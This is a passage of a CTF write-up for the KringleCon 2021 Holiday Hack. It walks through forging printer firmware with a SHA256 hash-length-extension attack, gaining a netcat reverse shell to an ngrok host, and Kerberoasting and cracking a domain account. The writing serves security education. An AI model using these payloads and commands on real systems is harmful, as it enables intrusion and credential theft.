  <span class="nf">mov</span> <span class="no">rdx</span><span class="p">,</span> <span class="no">rax</span>          <span class="c">; string length
</span><span class="c"></span>  <span class="no">mov</span> <span class="no">rax</span><span class="p">,</span> <span class="mi">1</span>            <span class="c">; sys_write
</span><span class="c"></span>  <span class="no">mov</span> <span class="no">rdi</span><span class="p">,</span> <span class="mi">1</span>            <span class="c">; stdout
</span><span class="c"></span>  <span class="no">mov</span> <span class="no">rsi</span><span class="p">,</span> <span class="no">rsp</span>          <span class="c">; file content
</span><span class="c"></span>  <span class="no">syscall</span>

  <span class="nf">mov</span> <span class="no">rax</span><span class="p">,</span> <span class="mi">60</span>           <span class="c">; sys_exit
</span><span class="c"></span>  <span class="no">mov</span> <span class="no">rdi</span><span class="p">,</span> <span class="mi">99</span>
  <span class="nf">syscall</span>
</code></pre></td></tr></table>
</div>
</div><p>The output message is:</p>
<div class="box">Secret to KringleCon success: all of our speakers and organizers, providing the gift of cyber security knowledge, free to the community.</div>
<div class="notices success" data-title="Objective 6 answer">
  cyber security knowledge
</div>
<h3 id="7---printer-exploitation">7 - Printer Exploitation</h3>
<hr />
<table>
<thead>
<tr>
<th>Difficulty</th>
<th>Objective</th>
<th>Location</th>
</tr>
</thead>
<tbody>
<tr>
<td>4/5</td>
<td>Investigate the stolen <a href="https://printer.kringlecastle.com/">Kringle Castle printer</a>. Get shell access to read the contents of <code>/var/spool/printer.log</code>. What is the name of the last file printed (with a <code>.xlsx</code> extension)? Find Ruby Cyster in Jack&rsquo;s office for help with this objective.</td>
<td>Jack&rsquo;s Office</td>
</tr>
</tbody>
</table>
<p>We access a <a href="https://printer.kringlecastle.com/incoming/">printer management web interface</a> and the goal is to exploit the firmware to read a file on the printer system.</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon4/objectives/obj07_02.webp" alt="Printer management interface" data-caption="Printer management interface" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Printer management interface
      
        
        
      
    </figcaption>
  
</figure>
<p>The <code>Settings</code> are protected by a password and trying some default passwords does not work. From the <code>Firmware Update</code> page, we can download the current firmware to analyse. This is a <em>JSON</em> file that is quite short and that contains the firmware data encoded in <em>Base64</em>, what seems its <em>SHA256</em> signature and a <code>secret_length</code> value that is makes no real sense at this point.</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon4/objectives/obj07_03.webp" alt="firmware-export.json" data-caption="firmware-export.json" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      firmware-export.json
      
        
        
      
    </figcaption>
  
</figure>
<p>We can decode the data as follows:</p>
<div class="box"><p>$ echo &ldquo;UEsDBBQAAAAIAEWlkFMWoKjwagkA[&hellip;]dXgLAAEEAAAAAAQAAAAAUEsFBgAAAAABAAEAUgAAALAJAAAAAA==&rdquo; | base64 -D &gt; firmware</p>
<p>$ file firmware<br />
firmware: Zip archive data, at least v2.0 to extract</p>
<p>$ unzip firmware<br />
$ file firmware.bin<br />
firmware.bin: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=fc77960dcdd5219c01440f1043b35a0ef0cce3e2, not stripped</p>
</div>
<p>We get a unique <code>firmware.bin</code> <em>ELF</em> executable that is not stripped, so will be easier to analyze. We can open it with <em>Ghidra</em>. However, it looks like a  dummy firmware that does nothing else that outputing a message:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon4/objectives/obj07_04.webp" alt="Firmware main function" data-caption="Firmware main function" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Firmware main function
      
        
        
      
    </figcaption>
  
</figure>
<p>If we alter some byte of the firmware data in the <em>JSON</em> file and try to update the firmware in the mangement console, we get the following error:</p>
<div class="box"><p>Firmware update failed:</p>
<p>Failed to verify the signature! Make sure you are signing the data correctly: sha256(&lt;secret&gt; + raw_file_data)</p>
</div>
<p>By <code>raw_file_data</code>, we suppose it means the <em>ZIP</em> file. This leaves the firmware vulnerable to a <em>Hash Extension Attack</em> as it ticks all the boxes:</p>
<ul>
<li>the secret is prepended to the hashed data</li>
<li>the hash algorithm is susceptible to this kind of attack</li>
<li>we have the secret length</li>
</ul>
<p>The idea that comes into mind for the whole attack at this point is:</p>
<ul>
<li>create an executable payload and <em>ZIP</em> it</li>
<li>append this additional <em>ZIP</em> file to the firmware <em>ZIP</em> archive (by concatenating 2 such files, only the second one will be unpacked and executed)</li>
<li>compute the new valid hash using the <a href="https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks">Hash Extension Attacks</a></li>
<li>reconstruct the <em>JSON</em> file with the new data and hash</li>
<li>upload the printer firmware</li>
</ul>
<p>Let&rsquo;s first try to bypass the signature verification with dummy data appended to the <em>ZIP</em> archive. Let&rsquo;s append <code>12345</code> and use <code>hash_extender</code> to compute the new hash and data.</p>
<div class="alert alert-info" role="alert" data-dir="ltr"><code>hash_extender</code> can be cloned from this repo: <a href="https://github.com/iagox86/hash_extender">https://github.com/iagox86/hash_extender</a>. Then we only need to run <code>make</code> to compile it.</div>
<p>The following command will generate the new hash. The signature is the one found in the firmware we have downloaded:</p>
<div class="box">$ ./hash_extender --file firmware --append 12345 --signature 2bab052bf894ea1a255886fde202f451476faba7b941439df629fdeb1ff0dc97 --secret 16 --format sha256</div>
<figure >
  
  
  
    <img data-src="/images/kringlecon4/objectives/obj07_05.webp" alt="hash_extender" data-caption="hash_extender" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      hash_extender
      
        
        
      
    </figcaption>
  
</figure>
<p>Let&rsquo;s retrieve the new signature and the new data. For the new firmware data, we can directly compute its <em>Base64</em> string. Then we can replace the values of the <em>JSON</em> file with these ones:</p>
<div class="box"><p># get new file data in base64<br />
$ HASH=$(./hash_extender --file firmware --append 12345 --signature 2bab052bf894ea1a255886fde202f451476faba7b941439df629fdeb1ff0dc97 --secret 16 --format sha256 | tail -3 | head -1 | cut -d' ' -f 3)</p>
<p># get the signature<br />
$ FIRMWARE_B64=$(./hash_extender --file firmware --append 12345 --signature 2bab052bf894ea1a255886fde202f451476faba7b941439df629fdeb1ff0dc97 --secret 16 --format sha256 | tail -2 | head -1 | cut -d' ' -f 3 | xxd -r -p | base64)</p>
<p># modify JSON file<br />
# -i_bak modifies the file in place but creates a backup file with _bak suffix<br />
# -E enables support for extended regexes, necessary to use \1, \2 flags<br />
$ sed -i_bak -E -e 's|(signature&quot;:&quot;).*(&quot;,&quot;sec)|\1'&quot;$HASH&quot;'\2|g' -e 's|(firmware&quot;:&quot;).*(&quot;,&quot;sig)|\1'&quot;$FIRMWARE_B64&quot;'\2|g' firmware-export.json</p>
</div>
<p>We upload the new firmware and see that the signature validation passes! Now, onto the real payload. The objective of this challenge is to retrieve the <code>/var/spool/printer.log</code> file. To do so, we could copy it in the <code>/app/lib/public/incoming</code> folder that will make it accessible under <a href="https://printer.kringlecastle.com/incoming/">https://printer.kringlecastle.com/incoming/</a>.</p>
<p>Let&rsquo;s first try with a basic shell payload and see if it gets executed. The payload will look like:</p>
<div class="box">#!/bin/bash<br />
cp /var/spool/printer.log /app/lib/public/incoming/noob.log</div>
<p>Make sure to make it executable (just in case) with <code>chmod +x payload.sh</code>.</p>
<p>Then we zip it with <code>zip payload.zip payload.sh</code> and reuse the same commads as above to modify the <em>JSON</em> file. But how to append the file data? <code>--append $(cat payload.zip)</code> does not work as the data is truncated due to the null bytes. A way that worked was to use <code>hexdump</code> to get a hex string of the file and add the <code>--append-format hex</code> flag to the command. The commands become:</p>
<div class="box"><p>$ HASH=$(./hash_extender --file firmware --append $(hexdump -ve '1/1 &quot;%.2x&quot;' payload.zip) --append-format hex --signature 2bab052bf894ea1a255886fde202f451476faba7b941439df629fdeb1ff0dc97 --secret 16 --format sha256 | tail -3 | head -1 | cut -d' ' -f 3)</p>
<p>$ FIRMWARE_B64=$(./hash_extender --file firmware --append $(hexdump -ve '1/1 &quot;%.2x&quot;' payload.zip) --append-format hex --signature 2bab052bf894ea1a255886fde202f451476faba7b941439df629fdeb1ff0dc97 --secret 16 --format sha256 | tail -2 | head -1 | cut -d' ' -f 3 | xxd -r -p | base64)</p>
<p>$ sed -i_bak -E -e 's|(signature&quot;:&quot;).*(&quot;,&quot;sec)|\1'&quot;$HASH&quot;'\2|g' -e 's|(firmware&quot;:&quot;).*(&quot;,&quot;sig)|\1'&quot;$FIRMWARE_B64&quot;'\2|g' firmware-export.json</p>
</div>
<p>But when we upload the firmware, we get the following error:</p>
<div class="box"><p>Firmware update failed:</p>
<p>Failed to parse the ZIP file: Could not extract firmware.bin from the archive:</p>
<p>$ unzip &lsquo;/tmp/20211225-1-1uqipjq&rsquo; &lsquo;firmware.bin&rsquo; -d &lsquo;/tmp/20211225-1-1uqipjq-out&rsquo; 2&gt;&amp;1 &amp;&amp; /tmp/20211225-1-1uqipjq-out/firmware.bin</p>
<p>Archive:  /tmp/20211225-1-1uqipjq<br />
warning [/tmp/20211225-1-1uqipjq]:  2608 extra bytes at beginning or within zipfile<br />
(attempting to process anyway)<br />
caution: filename not matched:  firmware.bin</p>
</div>
<p>We rename our shell script to <code>firmware.bin</code>, zip it again and modifiy our <em>JSON</em> file accordingly. The firmware is accepted, and when querying <a href="https://printer.kringlecastle.com/incoming/noob.log,">https://printer.kringlecastle.com/incoming/noob.log,</a> we get the following information:</p>
<div class="box"><p>Documents queued for printing<br />
=============================</p>
<p>Biggering.pdf<br />
Size Chart from <a href="https://clothing.north.pole/shop/items/TheBigMansCoat.pdf">https://clothing.north.pole/shop/items/TheBigMansCoat.pdf</a><br />
LowEarthOrbitFreqUsage.txt<br />
Best Winter Songs Ever List.doc<br />
Win People and Influence Friends.pdf<br />
Q4 Game Floor Earnings.xlsx<br />
Fwd: Fwd: [EXTERNAL] Re: Fwd: [EXTERNAL] LOLLLL!!!.eml<br />
Troll_Pay_Chart.xlsx</p>
</div>
<p>Let&rsquo;s try to have a reverse shell just for fun. We can use <a href="https://ngrok.com/"><code>ngrok</code></a> to expose a public <em>TCP</em> endpoint that will forward the traffic locally. We run it with <code>ngrok tcp 1337</code> where 1337 is the local port. We can then use the forwarding endpoint given in our <code>firmware.bin</code> file with <em>Netcat</em>:</p>
<div class="box">#!/bin/bash<br />
nc 6.tcp.ngrok.io 14681 -e /bin/bash</div>
<p>Once this endpoint is hit, the traffic will be forwarding on local host on port 1337 so we spawn a <em>Netcat</em> listener with <code>nc -lnvp 1337</code>. We rebuild our <em>JSON</em> file and upload it. We get a reverse shell instantly!</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon4/objectives/obj07_06.webp" alt="Reverse shell" data-caption="Reverse shell" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Reverse shell
      
        
        
      
    </figcaption>
  
</figure>
<p>We can now explore the remote host. We can a well upgrade our shell to a full interactive <em>TTY</em> by following <a href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/#tldr-cheatsheet">this procedure</a>. We can find the following additional information:</p>
<ul>
<li>the source code of the app is in <code>/app/lib/app.rb</code></li>
<li>the secret key used is <code>mybigsigningkey!</code></li>
<li>there is a secret route <code>/secretendpointforuptime</code> that returns the message <code>follow the white rabbit....</code></li>
</ul>
<div class="notices success" data-title="Objective 7 answer">
  Troll_Pay_Chart.xlsx
</div>
<h3 id="8---kerberoasting-on-an-open-fire">8 - Kerberoasting on an Open Fire</h3>
<hr />
<table>
<thead>
<tr>
<th>Difficulty</th>
<th>Objective</th>
<th>Location</th>
</tr>
</thead>
<tbody>
<tr>
<td>5/5</td>
<td>Obtain the secret sleigh research document from a host on the <em>Elf University</em> domain. What is the first secret ingredient <strong>Santa</strong> urges each elf and reindeer to consider for a wonderful holiday season? Start by registering as a student on the <a href="https://register.elfu.org/">ElfU Portal</a>. Find <strong>Eve Snowshoes</strong> in <strong>Santa</strong>&rsquo;s office for hints.</td>
<td>Online</td>
</tr>
</tbody>
</table>
<p>We access the <a href="https://register.elfu.org/">Elf University Student Registration portal</a>. When we register, we get access to the university internal domain and services through <em>SSH</em>:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon4/objectives/obj08_02.webp" alt="ElfU Registration Portal" data-caption="ElfU Registration Portal" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      ElfU Registration Portal
      
        
        
      
    </figcaption>
  
</figure>
<div class="alert alert-info" role="alert" data-dir="ltr">Note that the initial username may change multiple time in the below walkthrough as we had to generate the <em>SSH</em> access multiple times and is random.</div>
<p>Once we log in, we access a student portal:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon4/objectives/obj08_03.webp" alt="Elf University Student Grades Portal" data-caption="Elf University Student Grades Portal" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Elf University Student Grades Portal
      
        
        
      
    </figcaption>
  
</figure>
<p>First thing to do it to escape this &ldquo;jail&rdquo;. We do not know what kind of application it is and after playing with some code injection or other <em>SSH</em> commands, a simple <code>CRTL-D</code> generates an error that gives access to the <em>Python</em> interpreter. From there we get a shell with <code>os.system('/bin/bash')</code>:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon4/objectives/obj08_04.webp" alt="Python jail escape" data-caption="Python jail escape" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Python jail escape
      
        
        
      
    </figcaption>
  
</figure>
<p>Let&rsquo;s change the user shell with <code>chsh</code> so we do not come to the same jail each and every time we log in:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon4/objectives/obj08_06.webp" alt="Change user shell" data-caption="Change user shell" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Change user shell
      
        
        
      
    </figcaption>
  
</figure>
<p>From the output of the command, we see that the grade application is found in <code>/opt/grading_system</code>. But nothing special is to be seen there. Let&rsquo;s check if there are hosts alive on the network. The subnet we are in is <code>172.17.0.0/16</code>. Running a ping sweep scan gives us the following hosts:</p>
<div class="box">$ nmap -sP -T5 172.17.0.0/16<br />
[&hellip;]<br />
Nmap scan report for 172.17.0.1<br />
Host is up (0.00042s latency).<br />
Nmap scan report for grades.elfu.local (172.17.0.2)<br />
Host is up (0.00036s latency).<br />
Nmap scan report for 172.17.0.3<br />
Host is up (0.00028s latency).<br />
Nmap scan report for 172.17.0.4<br />
Host is up (0.00039s latency).<br />
Nmap scan report for 172.17.0.5<br />
Host is up (0.00051s latency).</div>
<p>If we check our routing table, we see routes for other subnets:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon4/objectives/obj08_05.webp" alt="Routing table" data-caption="Routing table" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Routing table
      
        
        
      
    </figcaption>
  
</figure>
<p>Scanning those subnets shows these additional hosts alive:</p>
<div class="box">hhc21-windows-linux-docker.c.holidayhack2021.internal (10.128.1.4)<br />
10.128.2.3-202<br />
10.128.3.25-60</div>
<p>The <code>hhc21-windows-linux-docker.c.holidayhack2021.internal</code> host is the webserver hosting the <em>ElfU Registration Portal</em>. The hosts 172.17.0.3-5 are <em>Windows</em> hosts (<em>SMB</em> ports are open). Moreover, 172.17.0.4 is an <em>Active Directory</em> server with the usual ports open. Most of the hosts on the 10.x.x.x subnet have all the same ports open (22, 80, 2222 or with additional 139, 445 ports) except for 10.128.3.30 that seems to be another <em>Active Directory</em> server.</p>
<p>Additionally, when scanning with the <code>-PS22,445</code> option, we get yet another <em>Domain Contoller</em> with <em>IP</em> <code>10.128.1.53</code> that resolves to <code>hhc21-windows-dc.c.holidayhack2021.internal</code>.</p>
<p>Let&rsquo;s try to enumerate available shares accross all the subnets with <code>nmap --script smb-enum-shares -p445 &lt;subnet&gt;</code>. The only server that we can enumerate are the two domain controllers <code>172.17.0.3</code> and <code>10.128.3.30</code>. We see the same interesting shares on both server, but they all require authentication. Actually, both <em>IP</em> addresses seem to be of the same server called <code>share30</code>:</p>
<div class="box">elfu_svc_shr<br />
research_dep</div>
<p>With the <code>smb-os-discovery</code> <em>Nmap</em> script, we get the domain name <code>elfu.local</code>:</p>
<div class="box">Host script results:<br />
| smb-os-discovery:<br />
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)<br />
|   Computer name: share30<br />
|   NetBIOS computer name: SHARE30\x00<br />
|   Domain name: elfu.local<br />
|   FQDN: share30.elfu.local<br />
|_  System time: 2022-01-02T10:37:07+00:00</div>
<p>The user we get from the <em>ElfU Registration Portal</em> is a domain user. Unfortunately we do not have access to the above shares, but we can confirm that by accessing the <code>netlogon</code> or the <code>sysvol</code> shares from the <em>Powershell</em> terminal that is available on the box:</p>
<div class="box"><p>$ pwsh<br />
PS /home/inmwurtvsq&gt; smbclient \\10.128.3.30\sysvol -U elfu\inmwurtvsq<br />
Enter ELFU\inmwurtvsq&rsquo;s password:<br />
Try &ldquo;help&rdquo; to get a list of possible commands.<br />
smb: &gt; dir<br />
  .    D   0  Fri Oct 29 19:29:49 2021<br />
  ..   D   0  Sun Jan  2 08:01:40 2022<br />
elfu.local                          D        0  Fri Oct 29 19:29:49 2021</p>
<p>  41089256 blocks of size 1024. 34507796 blocks available</p>
</div>
<p>However, both shares are empty.</p>
<p>Let&rsquo;s now copy a few tools on the box. Namely, <a href="https://github.com/SecureAuthCorp/impacket"><em>Impacket</em></a> that we get first on our box from their <em>Github</em> account.</p>
<div class="box">$ git clone <a href="https://github.com/SecureAuthCorp/impacket.git">https://github.com/SecureAuthCorp/impacket.git</a><br />
$ scp -P 2222 -r ./impacket/ <a href="mailto:inmwurtvsq@grades.elfu.org">inmwurtvsq@grades.elfu.org</a>:/home/inmwurtvsq/impacket</div>
<p>Let&rsquo;s try to find any <em>Kerberoastable</em> user on <code>hhc21-windows-dc</code> (the other server, even with <em>LDAP</em> open ports, does not respond to <em>LDAP</em> queries). We can user the <em>Impacket</em> script <code>GetUserSPNs.py</code> as follows:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon4/objectives/obj08_07.webp" alt="Kerberoastable user" data-caption="Kerberoastable user" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Kerberoastable user
      
        
        
      
    </figcaption>
  
</figure>
<p>We get the hash of the user <code>elfu_svc</code> that we can try to crack with <code>hashcat</code> back on our own box. But first we need a wordlist. One of the hints for this challenge was to use <code>cewl</code> to generate a custom wordlist based on the <em>ElfU Registration Portal</em> website and use the <a href="https://github.com/NotSoSecure/password_cracking_rules">OneRuleToRuleThemAll.rule</a> mangling rule for <code>hashcat</code>. <em>CeWL</em> can be installed from <a href="https://github.com/digininja/CeWL">this Github repository</a>. Let&rsquo;s add as well the <code>--with-numbers</code> flag to <code>cewl</code> so words with numbers are not excluded, like the ones found in a comment in the source code:</p>
<div class="box">&lt;!&ndash; Remember the groups battling to win the karaoke contest earleir this year? I think they were rocks4socks, cookiepella, asnow2021,<br />
v0calprezents, Hexatonics, and reindeers4fears. Wow, good times! &ndash;&gt;</div>
<p>We can execute the following:</p>
<div class="box">$ wget <a href="https://raw.githubusercontent.com/NotSoSecure/password_cracking_rules/master/OneRuleToRuleThemAll.rule">https://raw.githubusercontent.com/NotSoSecure/password_cracking_rules/master/OneRuleToRuleThemAll.rule</a><br />
$ ./CeWL/cewl.rb <a href="https://register.elfu.org/register">https://register.elfu.org/register</a> --with-numbers &gt; wordlist.txt<br />
$ wc -l wordlist.txt<br />
  78 wordlist.txt<br />
$ hashcat -m 13100 -a 0 ./spns.txt -r ./OneRuleToRuleThemAll.rule ./wordlist.txt</div>
<p>And the <code>elfu_svc</code> password is <code>Snow2021!</code>. Let&rsquo;s see if this user can read the 2 shares we identified previously. So back to the <code>grades</code> host. We have access to a bunch of <em>Powershell</em> scripts in the <code>elfu_svc_shr</code> share:</p>
<div class="box">$ pwsh<br />
PS /home/inmwurtvsq&gt; smbclient \\10.128.3.30\elfu_svc_shr -U elfu\elfu_svc<br />
Enter ELFU\elfu_svc&rsquo;s password:<br />
Try &ldquo;help&rdquo; to get a list of possible commands.<br />
smb: &gt; dir<br />
  .   D        0  Thu Dec  2 16:39:42 2021<br />
  ..  D        0  Sun Jan  2 08:01:34 2022<br />
  Get-NavArtifactUrl.ps1              N     2018  Wed Oct 27 19:12:43 2021<br />
  Get-WorkingDirectory.ps1            N      188  Wed Oct 27 19:12:43 2021<br />
  Stop-EtwTraceCapture.ps1            N      924  Wed Oct 27 19:12:43 2021<br />
  create-knownissue-function.ps1      N     2104  Wed Oct 27 19:12:43 2021<br />
  PsTestFunctions.ps1                 N    52454  Wed Oct 27 19:12:43 2021<br />
  StoreIngestionApplicationApi.ps1      N   108517  Wed Oct 27 19:12:43 2021<br />
  Compile-ObjectsInNavContainer.ps1      N     4431  Wed Oct 27 19:12:43 2021<br />
  Run-ConnectionTestToNavContainer.ps1      N    13856  Wed Oct 27 19:12:43 2021<br />
  StoreIngestionIapApi.ps1            N    80725  Wed Oct 27 19:12:43 2021<br />
  Test-SdnKnownIssue.ps1              N     4384  Wed Oct 27<br />
[&hellip;]</div>
